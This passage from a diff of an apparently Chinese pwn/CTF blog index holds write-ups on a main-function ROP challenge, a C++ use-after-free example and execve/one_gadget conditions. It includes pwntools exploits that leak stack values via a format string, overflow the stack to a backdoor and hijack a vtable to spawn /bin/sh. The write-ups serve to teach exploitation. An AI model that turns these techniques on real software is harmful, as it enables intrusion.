10h</span><br><span class="line">.text:080485E9                 sub     esp, 0Ch</span><br><span class="line">.text:080485EC                 lea     eax, [ebp+var_28]</span><br><span class="line">.text:080485EF                 push    eax             ; s</span><br><span class="line">.text:080485F0                 call    _gets</span><br><span class="line">.text:080485F5                 add     esp, 10h</span><br><span class="line">.text:080485F8                 mov     eax, 0</span><br><span class="line">.text:080485FD                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048600                 leave</span><br><span class="line">.text:08048601                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048604                 retn</span><br><span class="line">.text:08048604 ; &#125; &#x2F;&#x2F; starts at 8048595</span><br></pre></td></tr></table></figure>
+
+
+
+<p>漏洞点很明显存在<strong>格式化字符串以及栈溢出</strong></p>
+<h2 id="main函数的开头结尾"><a href="#main函数的开头结尾" class="headerlink" title="main函数的开头结尾"></a>main函数的开头结尾</h2><p>对于main函数的ROP相比于其他函数有很大的不一样，最重要的地方就是最前和最后那几条语句</p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea ecx, [esp+4]</span><br><span class="line">and esp, 0xfffffff0</span><br><span class="line">push [ecx-4]</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">push ecx</span><br></pre></td></tr></table></figure>
+
+<h4 id="对应的栈帧"><a href="#对应的栈帧" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- esp</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		; [ecx - 4] &#x3D;&#x3D; [ret]</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx</span><br></pre></td></tr></table></figure>
+
+<h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>由于在<code>call main</code>的时候，<code>esp</code>指向的就是<code>main的ret</code>也就是<code>__libc_start_main+offset</code>的位置，然后<code>lea ecx, [esp-4]</code>使得<code>ecx</code>指向了<code>ret</code>之后的一个地址。然后经过<code>and esp, 0xfffffff0</code>之后，<code>esp</code>向上变化了一定的空间，又通过<code>push ecx</code>起到了保存的作用</p>
+<h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><h4 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<h4 id="对应的栈帧-1"><a href="#对应的栈帧-1" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- ebp+var_4</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+		</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx(stack)</span><br></pre></td></tr></table></figure>
+
+<h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p>main函数返回的时候，会先把<code>ebp-4</code>里面保存的<code>原ecx</code>寄存器的值还原，然后根据这个<code>ecx</code>的值，找到真正的<code>ret</code></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>因为ROP需要劫持返回地址，那么在不知道原<code>ecx</code>值的情况下是无法真正劫持<code>ret</code>的，所以给了一个格式化字符串泄漏栈内的值，在泄漏了值之后就变得简单了</p>
+<h3 id="附上exp"><a href="#附上exp" class="headerlink" title="附上exp"></a>附上exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./qiandao&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;183.129.189.60&quot;, 10013)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x804857D</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">formats = <span class="string">&quot;%13$p&quot;</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;name:&quot;</span>, formats)</span><br><span class="line">sh.recvline()</span><br><span class="line">bp = <span class="built_in">int</span>(sh.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">cx = bp - <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">print(<span class="string">&quot;bp ==&gt; &quot;</span> + <span class="built_in">hex</span>(bp))</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&quot;b *0x080485FD&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = junk + p32(cx) + p32(backdoor) + p32(cx - <span class="number">8</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;problem&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+        <category>ROP</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ROP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一个堆溢出的小例子</title>
+    <url>//an_example.html</url>
+    <content><![CDATA[<ul>
+<li>让程序中，有两个指标指向同一个chunk<ul>
+<li>一块是<strong>structure</strong>，另一块是用作<strong>data buffer</strong></li>
+<li>利用对<strong>buffer</strong>的读写，泄露或者修改<strong>structure</strong>的内容</li>
+</ul>
+</li>
+</ul>
+<a id="more"></a>
+
+<h3 id="练习程序"><a href="#练习程序" class="headerlink" title="练习程序"></a>练习程序</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;class A&quot;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;class B&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1233\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pause</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//setbuf(stdin,0);</span></span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	A *p = <span class="keyword">new</span> B();</span><br><span class="line">	<span class="keyword">delete</span> p;</span><br><span class="line">	add();</span><br><span class="line">	fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line">	pause();</span><br><span class="line">	add();</span><br><span class="line">	<span class="keyword">char</span> *q = strdup(buf);</span><br><span class="line">	p-&gt;print();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><em>说明:其中的<strong>add()**函数，是我用来改变</strong>sh()<strong>的地址的,(本来是0a结尾，会被截断)，</strong>pause()**是调试的时候用来下断点的，setvbuf(stdin,0,2,0)是必须的，不然fgets会拿走fastbin</em></p>
+<p>在CPP中，new对象的时候会创建一个堆块，里面放入参数和函数的地址，这里delete p之后并没有让p指向null，所以p指针还有值，可以被调用，<code>q = srtdup(buf)</code>可以拿到q对应的堆块，<strong>改写其中的指针，使其指向buf + 8 ，然后让buf + 8指向sh()**，就可以调用</strong>sh()**函数</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./UAF&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;1233&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x601160</span> + <span class="number">8</span>) + p64(<span class="number">0x40091b</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>pwn</category>
         <category>heap</category>
@@ -2467,45 +2525,71 @@
       </tags>
   </entry>
   <entry>
-    <title>main函数的ROP问题</title>
-    <url>//main_rop.html</url>
-    <content><![CDATA[<p>示例：安恒7月月赛签到题</p>
-<p><strong>本文主要探讨的是main函数的ROP问题，不是题解（</strong></p>
+    <title>one_gadget条件的探寻</title>
+    <url>//one_gadget.html</url>
+    <content><![CDATA[<p>one_gadget的条件并没有那么苛刻，有很大的宽限余地</p>
+<p>感谢 <a href="https://blog.csdn.net/weixin_44864859">棂星</a> 师傅发现问题，感谢<a href="http://taqini.space/2020/04/29/about-execve/">TaQini师傅博客参考资料</a></p>
 <a id="more"></a>
 
 
 
-<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>伪C代码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what&#x27;s your name:&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nCan you solve this sign-in problem?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h2><p>Linux下execve函数的描述</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], </span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>; </span><br></pre></td></tr></table></figure>
 
-<p>对应的汇编代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048595 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048595                 public main</span><br><span class="line">.text:08048595 main            proc near               ; DATA XREF: _start+17↑o</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 var_28          &#x3D; byte ptr -28h</span><br><span class="line">.text:08048595 s               &#x3D; byte ptr -18h</span><br><span class="line">.text:08048595 var_4           &#x3D; dword ptr -4</span><br><span class="line">.text:08048595 argc            &#x3D; dword ptr  8</span><br><span class="line">.text:08048595 argv            &#x3D; dword ptr  0Ch</span><br><span class="line">.text:08048595 envp            &#x3D; dword ptr  10h</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 ; __unwind &#123;</span><br><span class="line">.text:08048595                 lea     ecx, [esp+4]</span><br><span class="line">.text:08048599                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804859C                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0804859F                 push    ebp</span><br><span class="line">.text:080485A0                 mov     ebp, esp</span><br><span class="line">.text:080485A2                 push    ecx</span><br><span class="line">.text:080485A3                 sub     esp, 24h</span><br><span class="line">.text:080485A6                 call    init</span><br><span class="line">.text:080485AB                 sub     esp, 0Ch</span><br><span class="line">.text:080485AE                 push    offset s        ; &quot;what&#39;s your name:&quot;</span><br><span class="line">.text:080485B3                 call    _puts</span><br><span class="line">.text:080485B8                 add     esp, 10h</span><br><span class="line">.text:080485BB                 sub     esp, 0Ch</span><br><span class="line">.text:080485BE                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485C1                 push    eax             ; s</span><br><span class="line">.text:080485C2                 call    _gets</span><br><span class="line">.text:080485C7                 add     esp, 10h</span><br><span class="line">.text:080485CA                 sub     esp, 0Ch</span><br><span class="line">.text:080485CD                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485D0                 push    eax             ; format</span><br><span class="line">.text:080485D1                 call    _printf</span><br><span class="line">.text:080485D6                 add     esp, 10h</span><br><span class="line">.text:080485D9                 sub     esp, 0Ch</span><br><span class="line">.text:080485DC                 push    offset aCanYouSolveThi ; &quot;\nCan you solve this sign-in problem?&quot;</span><br><span class="line">.text:080485E1                 call    _puts</span><br><span class="line">.text:080485E6                 add     esp, 10h</span><br><span class="line">.text:080485E9                 sub     esp, 0Ch</span><br><span class="line">.text:080485EC                 lea     eax, [ebp+var_28]</span><br><span class="line">.text:080485EF                 push    eax             ; s</span><br><span class="line">.text:080485F0                 call    _gets</span><br><span class="line">.text:080485F5                 add     esp, 10h</span><br><span class="line">.text:080485F8                 mov     eax, 0</span><br><span class="line">.text:080485FD                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048600                 leave</span><br><span class="line">.text:08048601                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048604                 retn</span><br><span class="line">.text:08048604 ; &#125; &#x2F;&#x2F; starts at 8048595</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>  argv是要调用的程序执行的参数序列，也就是我们要调用的程序需要传入的参数。</p>
+</li>
+<li><p>  envp 同样也是参数序列，一般来说他是一种键值对的形式 key=value. 作为我们是新程序的环境。</p>
+</li>
+</ul>
+<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><h3 id="零个参数"><a href="#零个参数" class="headerlink" title="零个参数"></a>零个参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这显然可以。</p>
+<h3 id="一个参数"><a href="#一个参数" class="headerlink" title="一个参数"></a>一个参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">&quot;asdadadas&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<p><img src="one_gadget/image-20200720225143097.png" alt="image-20200720225143097"></p>
+<p>得到了一个shell，观察此时的<code>argv[]</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDX: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDI: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBP: 0x7fffffffdf60 --&gt; 0x555555554730 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">RIP: 0x555555554701 (&lt;main+87&gt;:	call   0x555555554580 &lt;execve@plt&gt;)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x5555555545a0 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x5555555546f7 &lt;main+77&gt;:	mov    rax,QWORD PTR [rbp-0x38]</span><br><span class="line">   0x5555555546fb &lt;main+81&gt;:	mov    rsi,rcx</span><br><span class="line">   0x5555555546fe &lt;main+84&gt;:	mov    rdi,rax</span><br><span class="line">&#x3D;&gt; 0x555555554701 &lt;main+87&gt;:	call   0x555555554580 &lt;execve@plt&gt;</span><br><span class="line">   0x555555554706 &lt;main+92&gt;:	mov    eax,0x0</span><br><span class="line">   0x55555555470b &lt;main+97&gt;:	mov    rsi,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x55555555470f &lt;main+101&gt;:	xor    rsi,QWORD PTR fs:0x28</span><br><span class="line">   0x555555554718 &lt;main+110&gt;:	je     0x55555555471f &lt;main+117&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">arg[1]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">arg[2]: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">arg[3]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">0008| 0x7fffffffdf28 --&gt; 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">0016| 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">0056| 0x7fffffffdf58 --&gt; 0x219a7d923809200 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000555555554701	8	    execve(filename, argv, envp);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>观察到<code>rsi(0x7fffffffdf40)</code>处的值为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;) ; &lt;-- 合法指针</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x0 ; &lt;-- NULL(合法指针) </span><br></pre></td></tr></table></figure>
 
 
 
-<p>漏洞点很明显存在<strong>格式化字符串以及栈溢出</strong></p>
-<h2 id="main函数的开头结尾"><a href="#main函数的开头结尾" class="headerlink" title="main函数的开头结尾"></a>main函数的开头结尾</h2><p>对于main函数的ROP相比于其他函数有很大的不一样，最重要的地方就是最前和最后那几条语句</p>
-<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea ecx, [esp+4]</span><br><span class="line">and esp, 0xfffffff0</span><br><span class="line">push [ecx-4]</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">push ecx</span><br></pre></td></tr></table></figure>
+<h3 id="两个参数"><a href="#两个参数" class="headerlink" title="两个参数"></a>两个参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">&quot;asdadadas&quot;</span>, <span class="string">&quot;1.sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="对应的栈帧"><a href="#对应的栈帧" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- esp</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		; [ecx - 4] &#x3D;&#x3D; [ret]</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx</span><br></pre></td></tr></table></figure>
+<p>其中<code>1.sh</code>是我自己创建的一个文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@shiroha:/mnt/hgfs/sharedPwn/vn_2020_simpleHeap$ cat 1.sh </span><br><span class="line">echo hello</span><br></pre></td></tr></table></figure>
 
-<h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>由于在<code>call main</code>的时候，<code>esp</code>指向的就是<code>main的ret</code>也就是<code>__libc_start_main+offset</code>的位置，然后<code>lea ecx, [esp-4]</code>使得<code>ecx</code>指向了<code>ret</code>之后的一个地址。然后经过<code>and esp, 0xfffffff0</code>之后，<code>esp</code>向上变化了一定的空间，又通过<code>push ecx</code>起到了保存的作用</p>
-<h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><h4 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>程序的运行结果如下</p>
+<p><img src="one_gadget/image-20200720224735113.png" alt="image-20200720224735113"></p>
+<p>成功运行了<code>1.sh</code>但是并没有返回一个shell，观察此时<code>argv[]</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDX: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDI: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBP: 0x7fffffffdf60 --&gt; 0x555555554730 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">RIP: 0x55555555470c (&lt;main+98&gt;:	call   0x555555554580 &lt;execve@plt&gt;)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x5555555545a0 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554702 &lt;main+88&gt;:	mov    rax,QWORD PTR [rbp-0x38]</span><br><span class="line">   0x555555554706 &lt;main+92&gt;:	mov    rsi,rcx</span><br><span class="line">   0x555555554709 &lt;main+95&gt;:	mov    rdi,rax</span><br><span class="line">&#x3D;&gt; 0x55555555470c &lt;main+98&gt;:	call   0x555555554580 &lt;execve@plt&gt;</span><br><span class="line">   0x555555554711 &lt;main+103&gt;:	mov    eax,0x0</span><br><span class="line">   0x555555554716 &lt;main+108&gt;:	mov    rsi,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x55555555471a &lt;main+112&gt;:	xor    rsi,QWORD PTR fs:0x28</span><br><span class="line">   0x555555554723 &lt;main+121&gt;:	je     0x55555555472a &lt;main+128&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">arg[1]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">arg[2]: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">arg[3]: 0x7fffffffdf40 --&gt; 0x5555555547bc 